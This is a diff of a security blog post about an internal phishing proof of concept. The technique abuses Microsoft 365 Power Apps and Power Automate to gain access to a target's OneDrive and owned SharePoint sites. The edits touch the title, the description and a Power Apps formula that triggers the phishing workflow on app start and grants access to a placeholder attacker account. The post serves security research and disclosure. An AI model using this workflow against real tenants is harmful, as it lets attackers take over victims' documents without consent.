@@ -1,8 +1,8 @@
 ---
 layout: post
-title: M365 Internal Phish | Abusing SharePoint and OneDrive API with Power Apps and Power Automate
+title: M365 Internal Phish | Abusing SharePoint and OneDrive APIs with Power Apps and Power Automate
 description: >-
-    An internal phishing POC leveraging Microsoft 365 citizen development tools (Power Platform). Subtly gain access to a target user's OneDrive / SharePoint sites they own. A YouTube video of the POC v1 can be found here: https://youtu.be/xXqFhN4wyGY
+    An internal phishing POC leveraging Microsoft 365 citizen development tools (Power Platform). Phish for access to a target user's OneDrive and all SharePoint sites they own. A YouTube video of the POC v1 can be found here: https://youtu.be/xXqFhN4wyGY
 tags: Microsoft PowerApps Power-Automate SharePoint OneDrive Phishing M365 POC Cloud Hacking Privilege-Escalation
 toc: true
 published: true
@@ -16,7 +16,7 @@ One note of warning. While Microsoft resolved the report, the technique still wo
 
 If you attempt to re-create the Proof of Concept in this post, I last worked on this side project months ago and functionality may have changed. You may need to do some work to get it to work (if it even still works).
 
-## Background & Details
+## Background & Overview
 
 The Office/Microsoft 365 suite has become incredibly powerful and gives power users in an organization the ability to quickly develop useful tools to help their business operate at peak performance. These tools are becoming more mainstream as businesses continue to adopt the suite, putting these tools in the hands of their employees. However, much like the Office suite (Word, Excel, PowerPoint, etc.) has been abused with embedded macros, the Power Platform offers some interesting ways to abuse it's extensive feature set leading to some unexpected results. While endpoint antivirus has become increasingly decent at catching embedded visual basic scripts detection on strange cloud activity is far less robust. 
 
@@ -91,7 +91,7 @@ As mentioned above, I have posted a [YouTube POC](https://youtu.be/xXqFhN4wyGY).
 2. Create a Power App that calls the workflow OnStart with the following parameters. The parameters for the function are (1) the victim's email, (2) the domain of the tenant (this can be hardcoded, my quick attempt at regex will probably not work in all environments) (3) the attacker's email (**update this**).
 
     ```bash
-    'POC-M365Phish'.Run(User().Email, First(MatchAll(User().Email, "(?<=@)[^.]+(?=\.)")).FullMatch, "attacker@domain.onmicrosoft.com")
+    'POC-M365Phish'.Run(User().Email, First(MatchAll(User().Email, "(?<=@)[^.]+")).FullMatch, "attacker@domain.onmicrosoft.com")
     ```
 
     [![](/assets/posts/2022/2022-05-13-Abusing-SharePoint-and-OneDrive-Permissions-with-PowerApps-and-Flow/20220512232924.png)](/assets/posts/2022/2022-05-13-Abusing-SharePoint-and-OneDrive-Permissions-with-PowerApps-and-Flow/20220512232924.png)  
